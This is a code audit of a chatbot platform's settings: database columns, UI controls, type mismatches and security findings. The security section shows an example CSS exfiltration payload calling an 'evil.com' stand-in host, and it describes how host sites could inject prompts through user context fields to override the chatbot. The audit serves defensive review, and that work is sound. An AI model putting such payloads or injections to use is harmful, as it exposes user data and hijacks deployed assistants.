# Chatbot Settings Audit

**Chatbot**: `support bot` (ID: `10df2440-6aac-441a-855d-715c0ea8e506`)
**Date**: 2026-03-19
**Scope**: Full trace of every setting from UI to database to runtime usage

---

## Executive Summary

The chatbot settings system is **functional but has several schema/type mismatches, missing UI controls for DB-backed settings, and security concerns**. Key findings:

1. **4 columns missing from generated TypeScript types** (`database.ts`): `enable_prompt_protection`, `pre_chat_form_config`, `post_chat_survey_config`, `proactive_messages_config`. The API layer works around this with `as any` casts.
2. **PreChatFieldType mismatch**: The settings UI defines field types `name | email | phone | company | custom` but `types.ts` defines `text | email | phone | select | textarea`. These are completely different sets.
3. **3 DB-backed settings have no UI**: `model`, `temperature`, `max_tokens` exist in the DB and are used by the chat API but have no settings page controls.
4. **DB migration default diverges from TypeScript default**: `file_upload_config` migration omits `max_files_per_message`, relying on app-level defaults.
5. **Widget config DB default is stale**: Missing 13+ newer color fields that exist in `DEFAULT_WIDGET_CONFIG`.
6. **Custom CSS injection risk**: The `customCss` field in widget config is rendered without sanitization.

---

## Settings Inventory

| Setting | DB Column | Settings UI | Customize UI | Used in Chat API | Used in Widget | Status |
|---|---|---|---|---|---|---|
| **name** | `name` (varchar) | General section | -- | -- | -- | OK |
| **description** | `description` (text) | General section | -- | -- | -- | OK |
| **welcome_message** | `welcome_message` (text) | General section | Preview only | Stored as first msg | Displayed | OK |
| **placeholder_text** | `placeholder_text` (varchar) | General section | Preview only | -- | Displayed | OK |
| **language** | `language` (text) | General section | -- | System prompt lang | Widget UI lang | OK |
| **system_prompt** | `system_prompt` (text) | Prompt section | -- | Injected as system | -- | OK |
| **enable_prompt_protection** | `enable_prompt_protection` (bool) | Prompt section | -- | Appended to prompt | -- | OK |
| **model** | `model` (varchar) | **NONE** | -- | Maps to ModelTier | -- | **MISSING UI** |
| **temperature** | `temperature` (numeric) | **NONE** | -- | Passed to AI call | -- | **MISSING UI** |
| **max_tokens** | `max_tokens` (int) | **NONE** | -- | Passed to AI call | -- | **MISSING UI** |
| **memory_enabled** | `memory_enabled` (bool) | Memory section | -- | Memory extraction | Memory verify flow | OK |
| **memory_days** | `memory_days` (int) | Memory section | -- | Passed to getUserMemory | -- | OK |
| **pre_chat_form_config** | `pre_chat_form_config` (jsonb) | Pre-Chat section | Preview only | Lead data in prompt | Pre-chat form render | OK (type issue) |
| **post_chat_survey_config** | `post_chat_survey_config` (jsonb) | Post-Chat section | Preview only | -- | Survey render | OK |
| **file_upload_config** | `file_upload_config` (jsonb) | File Uploads section | -- | Upload validation | Upload UI | OK |
| **proactive_messages_config** | `proactive_messages_config` (jsonb) | Proactive section | -- | Proactive msg stored | Trigger engine | OK |
| **transcript_config** | `transcript_config` (jsonb) | Transcripts section | -- | -- | Transcript flow | OK |
| **widget_config** | `widget_config` (jsonb) | -- | Full editor | -- | All visual rendering | OK |
| **logo_url** | `logo_url` (text) | **NONE** (shown in header) | -- | -- | Header display | **NO UPLOAD UI** |
| **status** | `status` (varchar) | Shown as badge | -- | Checked (must be active) | -- | OK |
| **is_published** | `is_published` (bool) | Overview page toggle | -- | Checked (must be true) | -- | OK |
| **slug** | `slug` (varchar) | Auto-generated | -- | -- | -- | OK |
| **monthly_message_limit** | `monthly_message_limit` (int) | **NONE** | -- | Enforced in chat API | -- | **NO UI** |
| **messages_this_month** | `messages_this_month` (int) | **NONE** | -- | Checked in chat API | -- | Counter only |
| **pricing_type** | `pricing_type` (varchar) | **NONE** | -- | -- | -- | Internal |
| **stripe_product_id** | `stripe_product_id` (varchar) | **NONE** | -- | -- | -- | Internal |
| **custom_text_updated_at** | `custom_text_updated_at` (timestamptz) | -- | -- | -- | -- | Tracking only |
| **language_updated_at** | `language_updated_at` (timestamptz) | -- | -- | -- | -- | Tracking only |
| **autoOpen** | `widget_config.autoOpen` | **NONE** | -- | -- | `useState(config.autoOpen)` | **MISSING UI** |
| **autoOpenDelay** | `widget_config.autoOpenDelay` | **NONE** | -- | -- | Timer-based open | **MISSING UI** |
| **soundEnabled** | `widget_config.soundEnabled` | **NONE** | -- | -- | Referenced in type | **MISSING UI** |
| **buttonSize** | `widget_config.buttonSize` | **NONE** | -- | -- | Used in render | **MISSING UI** |
| **offsetX/offsetY** | `widget_config.offsetX/Y` | **NONE** | -- | -- | Used in positioning | **MISSING UI** |

---

## Knowledge Base

**Page**: `/dashboard/chatbots/[id]/knowledge/page.tsx`
**API**: `/api/chatbots/[id]/knowledge/route.ts`

### Functionality
- Add sources: URL (with optional crawl + maxPages), plain text, Q&A pairs
- File uploads via drag-and-drop (PDF, DOCX)
- View source list with status badges (pending, processing, completed, failed)
- Delete individual sources
- Priority toggle (star icon) for always-included sources
- Auto-polling every 3s while sources are processing

### Findings
- **No re-process button** for failed sources (only delete and re-add)
- **No edit** for existing text/QA sources
- **No bulk operations** (delete all, re-process all)
- Priority source system works correctly: priority chunks get `similarity: 1.0` and appear first in RAG context
- Live URL fetching triggers when similarity confidence is below 0.9 threshold for pinned URLs

---

## Customize Widget

**Page**: `/dashboard/chatbots/[id]/customize/page.tsx`
**Saves to**: `widget_config` jsonb column via `PATCH /api/chatbots/[id]`

### Settings Exposed
- **Colors**: 21 color pickers (primary, background, header, user/bot bubbles, input area, send button, form colors, secondary button)
- **Typography**: Font family (25+ Google Fonts + system), font size slider, border radius sliders (container, input, button)
- **Layout**: Position (bottom-left / bottom-right only), width, height, show branding
- **Custom CSS**: Free-text textarea
- **Header text**: Editable

### Settings Missing from UI
| Setting in WidgetConfig | Default | In Widget Runtime | In Customize UI |
|---|---|---|---|
| `autoOpen` | false | Yes (initial state) | **No** |
| `autoOpenDelay` | 3000 | Yes (setTimeout) | **No** |
| `soundEnabled` | false | Referenced | **No** |
| `buttonSize` | 60 | Used in render | **No** |
| `offsetX` | 20 | Used in positioning | **No** |
| `offsetY` | 20 | Used in positioning | **No** |
| `secondaryColor` | #f0f9ff | In default | **No** |

### Live Preview
- 4 preview modes: Chat, Pre-Chat Form, Verify (memory), Post-Chat Survey
- Properly reflects all color/font changes in real-time
- Uses translated text based on chatbot language

### DB Default Staleness
The DB `widget_config` column default (from the original migration) contains only a subset of fields:
```
width, height, offsetX, offsetY, autoOpen, fontSize, position, customCss, textColor,
buttonSize, fontFamily, headerText, primaryColor, showBranding, soundEnabled,
autoOpenDelay, botBubbleColor, secondaryColor, backgroundColor, userBubbleColor
```

Missing from DB default (added later in TypeScript):
- `userBubbleTextColor`, `botBubbleTextColor`, `headerTextColor`
- `inputBackgroundColor`, `inputTextColor`, `inputPlaceholderColor`
- `sendButtonColor`, `sendButtonIconColor`
- `formBackgroundColor`, `formTitleColor`, `formDescriptionColor`, `formBorderColor`, `formLabelColor`, `formSubmitButtonTextColor`, `formPlaceholderColor`, `formInputBackgroundColor`, `formInputTextColor`
- `secondaryButtonColor`, `secondaryButtonTextColor`, `secondaryButtonBorderColor`
- `containerBorderRadius`, `inputBorderRadius`, `buttonBorderRadius`

This is mitigated by the merge pattern `{ ...DEFAULT_WIDGET_CONFIG, ...(db_config || {}) }` used in both the config API and the settings page, but means any chatbot created via direct DB insert would have incomplete config.

---

## Analytics

**Page**: `/dashboard/chatbots/[id]/analytics/page.tsx`
**API**: `/api/chatbots/[id]/analytics/route.ts`

### Settings/Features
- Date range selector: 7, 30, 90 days
- Metrics: Total conversations, messages, unique visitors, avg messages/conversation, satisfaction rate
- Daily bar charts for conversations and messages
- CSV export of analytics data

### Findings
- **No configurable settings** -- this is a read-only dashboard
- Satisfaction rate calculation depends on thumbs up/down feedback from messages
- No real-time updates (manual page refresh required)

---

## Leads & Chat

**Page**: `/dashboard/chatbots/[id]/leads/page.tsx`
**API**: `/api/chatbots/[id]/leads/route.ts`, `/api/chatbots/[id]/conversations/route.ts`

### Features
- Two tabs: Leads (pre-chat form submissions) and Conversations
- Lead detail dialog with form data display
- Conversation detail dialog with full message history
- Date filtering (all, today, week, month)
- CSV export for both leads and conversations
- Session-based filtering via URL param
- Sortable table columns

### Findings
- **Leads only exist when pre-chat form is enabled** -- no explanation in UI when lead list is empty and form is disabled
- Conversation list shows message count but this requires a separate join/count
- No search/filter by lead name or email
- No link from leads to their corresponding conversations

---

## Surveys

**Page**: `/dashboard/chatbots/[id]/surveys/page.tsx`
**API**: `/api/chatbots/[id]/surveys/route.ts`

### Features
- Survey response list with sortable table
- Rating distribution chart
- Stats: total responses, average rating, rating count
- Detail dialog for individual responses
- CSV export
- Date filtering

### Findings
- Survey responses are stored in `chatbot_survey_responses` table (separate from conversations)
- **Survey config is editable in Settings but results are viewed in Surveys page** -- no cross-link between them
- The `thankYouMessage` in `PostChatSurveyConfig` is defined in settings but its rendering depends on the widget implementation

---

## Sentiment & Loyalty

**Page**: `/dashboard/chatbots/[id]/sentiment/page.tsx`
**API**: `/api/chatbots/[id]/sentiment/route.ts`, `/api/chatbots/[id]/sentiment/analyze/route.ts`

### Features
- On-demand sentiment analysis (button to analyze unanalyzed conversations)
- Per-conversation sentiment scores and labels (very_negative to very_positive)
- Sentiment summary text per conversation
- Visitor loyalty tracking (loyalty score, trend: improving/stable/declining)
- Stats: total analyzed, avg score, positive/neutral/negative percentages
- CSV export
- Pagination

### Findings
- **No automatic analysis** -- requires manual trigger from the dashboard
- Sentiment data stored on the `conversations` table: `sentiment_score`, `sentiment_label`, `sentiment_summary`, `sentiment_analyzed_at`
- Loyalty data stored in separate `visitor_loyalty` table
- No configurable settings for sentiment (thresholds, auto-analysis frequency)

---

## Deploy

**Page**: `/dashboard/chatbots/[id]/deploy/page.tsx`
**API**: `/api/chatbots/[id]/publish/route.ts`

### Features
- Publish/unpublish status check
- 6 embed code variants with copy buttons:
  1. SDK auto-init (single script tag with `data-chatbot-id`)
  2. SDK manual init
  3. Next.js integration
  4. iframe embed
  5. Authenticated user integration (with `user` and `context` objects)
  6. REST API examples (curl + JavaScript)
- Live preview iframe
- Link to full SDK documentation

### Findings
- **Embed codes use `window.location.origin`** which is correct for the dashboard but means copied code has the dashboard URL, not a production URL. The `NEXT_PUBLIC_APP_URL` env var is used in the publish API but not in the deploy page.
- The iframe embed code is hardcoded to 400x600 and doesn't reflect the chatbot's actual `widget_config.width/height` settings.
- No mention of CORS configuration needed for cross-origin embedding.

---

## Security Findings

### Critical

1. **Custom CSS Injection**: The `customCss` field in `widget_config` is a free-text string. While the widget renders within an iframe which provides some isolation, CSS can be used for data exfiltration (e.g., `background: url('https://evil.com/steal?data=...')`), UI redressing, or content injection via `content:` properties. There is no sanitization or CSP applied to the custom CSS.

2. **CORS Wildcard on Chat API**: The chat API at `/api/chat/[chatbotId]/route.ts` returns `Access-Control-Allow-Origin: *` on all responses. This is intentional for a public embeddable widget, but combined with session IDs and visitor IDs in the response, it means any website can make authenticated API calls to any chatbot.

### High

3. **No Rate Limiting on Chat Endpoint**: The chat API checks monthly message limits but has no per-minute/per-IP rate limiting. A malicious actor could exhaust a chatbot's monthly quota in seconds.

4. **Prompt Injection via user_data/user_context**: While the `sanitizeContextValue` function in `rag.ts` filters some common injection patterns, the `userData` and `userContext` fields from the SDK are injected directly into the system prompt. A malicious host site could craft these to override chatbot behavior. The sanitization is regex-based and easy to bypass.

### Medium

5. **File Upload Config Not Enforced Server-Side**: The `file_upload_config` settings (allowed types, max size, max files) are read in the chat API for image processing, but the actual upload validation happens client-side in the widget. The upload endpoint should independently validate against the chatbot's config.

6. **Widget Config API Public and Cacheable**: The `/api/widget/[chatbotId]/config` endpoint returns the full widget configuration including pre-chat form fields, survey questions, and proactive message rules with a 1-minute cache. This exposes the chatbot owner's configured form structure to anyone with the chatbot ID.

7. **Admin Client Usage Without Scoping**: The chat API creates an admin client (`createAdminClient()`) to bypass RLS, which is necessary for public access. However, the `supabase` variable is then passed to multiple functions (`createMessage`, `getMessages`, etc.) that could potentially access data beyond the current chatbot's scope if there's a bug.

### Low

8. **Session ID Predictability**: Session IDs are generated as `session_{timestamp}_{random}` which is predictable enough for session enumeration. Not exploitable without the chatbot ID, but could be improved.

9. **No Input Sanitization on Logo URL**: The `logo_url` field accepts any URL and is rendered in an `<img>` tag. While this is validated as a URL by the zod schema, it could point to a tracking pixel or external resource.

---

## Type System Issues

### 1. Generated Types Out of Sync (Critical)

`src/types/database.ts` is missing 4 columns that exist in the actual DB schema:

| Column | In DB | In database.ts | In types.ts Chatbot interface |
|---|---|---|---|
| `enable_prompt_protection` | boolean NOT NULL DEFAULT true | **MISSING** | Yes |
| `pre_chat_form_config` | jsonb | **MISSING** | Yes |
| `post_chat_survey_config` | jsonb | **MISSING** | Yes |
| `proactive_messages_config` | jsonb | **MISSING** | Yes |

The codebase works around this with `as any` casts on the Supabase client (`type SupabaseAny = any` in `api.ts`), defeating TypeScript's safety guarantees.

**Fix**: Run `npm run db:gen-types` to regenerate `database.ts`.

### 2. PreChatFieldType Mismatch (High)

`types.ts` line 131:
```typescript
export type PreChatFieldType = 'text' | 'email' | 'phone' | 'select' | 'textarea';
```

Settings page line 1136-1142:
```typescript
const PRE_CHAT_FIELD_TYPES = [
  { value: 'name', label: 'Name' },      // NOT in PreChatFieldType
  { value: 'email', label: 'Email' },
  { value: 'phone', label: 'Phone' },
  { value: 'company', label: 'Company' }, // NOT in PreChatFieldType
  { value: 'custom', label: 'Custom' },   // NOT in PreChatFieldType
];
```

The UI offers `name`, `company`, `custom` as field types but these don't exist in the TypeScript union. The type uses `text`, `select`, `textarea` which the UI doesn't offer. This means the type assertion `as PreChatFieldType` on the select change handler is silently casting invalid values.

### 3. File Upload Config Migration Default

The DB migration default for `file_upload_config` is:
```json
{"enabled": false, "allowed_types": {"images": true, "documents": true, "spreadsheets": false, "archives": false}, "max_file_size_mb": 2}
```

The TypeScript default `DEFAULT_FILE_UPLOAD_CONFIG` adds `max_files_per_message: 3`. Any chatbot that hasn't been explicitly saved since the TypeScript change will have `max_files_per_message` as `undefined` in the DB, falling back to the `?? 3` nullish coalescing in the settings UI (line 827).

---

## Missing Features / Gaps

### Settings Page Gaps

1. **No model/temperature/max_tokens controls**: These exist in the DB schema and are used by the chat API but have no UI. The chatbot is created with database defaults (`claude-3-haiku-20240307`, temperature 0.7, max_tokens 1024) and can never be changed through the dashboard.

2. **No logo upload**: `logo_url` is shown in the settings header when present but there's no upload mechanism. It can only be set via direct API call.

3. **No monthly message limit management**: The limit is enforced in the chat API but not editable in the dashboard.

4. **No status management on settings page**: Status is shown as a badge but can only be changed via publish/unpublish on the overview page. There's no way to set `paused` or `archived` from the UI.

### Widget Customization Gaps

5. **No autoOpen/autoOpenDelay controls**: The widget supports auto-opening after a delay but there's no UI to configure this. The proactive messages feature partially overlaps (display mode: `open_widget`), but autoOpen is a simpler global behavior.

6. **No soundEnabled control**: Sound notification setting exists in the type and DB but has no UI.

7. **No button size control**: The chat button size is configurable in the type but not in the customize page.

8. **No offset controls**: Widget X/Y offset from screen edge is configurable but not exposed.

9. **Position only offers 2 of 4 options**: `WidgetConfig.position` supports `bottom-right | bottom-left | top-right | top-left` but the customize page only offers bottom-left and bottom-right.

### Cross-Page Gaps

10. **No link between Settings and Surveys**: You configure the post-chat survey in Settings but view results in Surveys -- there's no contextual link between them.

11. **No link between Settings Pre-Chat Form and Leads**: Same issue -- configure in Settings, view data in Leads.

12. **No automatic sentiment analysis**: Sentiment must be manually triggered; there's no option to auto-analyze after each conversation.

13. **No webhook/notification system**: No way to be notified of new leads, conversations, or low sentiment scores.

---

## Recommendations

### Priority 1 (Type Safety)

1. **Regenerate database types**: Run `npm run db:gen-types` to sync `database.ts` with the actual schema. This will eliminate the need for `as any` casts.

2. **Fix PreChatFieldType**: Align the type definition with the UI options, or vice versa. The UI's `name | email | phone | company | custom` is more semantically meaningful for a form builder. Update `types.ts`:
   ```typescript
   export type PreChatFieldType = 'name' | 'email' | 'phone' | 'company' | 'custom';
   ```

3. **Sync file_upload_config migration default**: Add `max_files_per_message` to the DB default, or create a migration to backfill existing rows.

### Priority 2 (Missing UI)

4. **Add AI model settings section**: Add a section to the settings page for `model` (dropdown), `temperature` (slider 0-2), and `max_tokens` (slider 100-4096). These are actively used in the chat API and currently stuck at DB defaults.

5. **Add widget behavior section to Customize page**: Auto-open toggle, auto-open delay slider, sound toggle, button size slider, offset controls.

6. **Add logo upload**: Add a file upload field to the General settings section for `logo_url`.

### Priority 3 (Security)

7. **Sanitize custom CSS**: Implement a CSS sanitizer that strips `url()`, `@import`, `expression()`, and other potentially dangerous CSS constructs before storing.

8. **Add rate limiting to chat API**: Implement per-IP rate limiting (e.g., 30 requests/minute) independent of monthly quotas.

9. **Server-side file upload validation**: Validate file type, size, and count against the chatbot's `file_upload_config` in the upload endpoint, not just client-side.

10. **Strengthen prompt injection sanitization**: The regex-based approach in `sanitizeContextValue` is easily bypassable. Consider using a more robust approach like token-level filtering or separate context windows.

### Priority 4 (UX)

11. **Cross-link settings to data pages**: Add "View Leads" link from Pre-Chat Form settings, "View Survey Results" from Post-Chat Survey settings.

12. **Widget config migration**: Create a DB migration to update the `widget_config` column default to include all current fields, preventing stale defaults for new chatbots created via direct DB insert.

13. **Add empty-state guidance**: When leads page is empty and pre-chat form is disabled, show a message explaining the connection and link to enable the form.
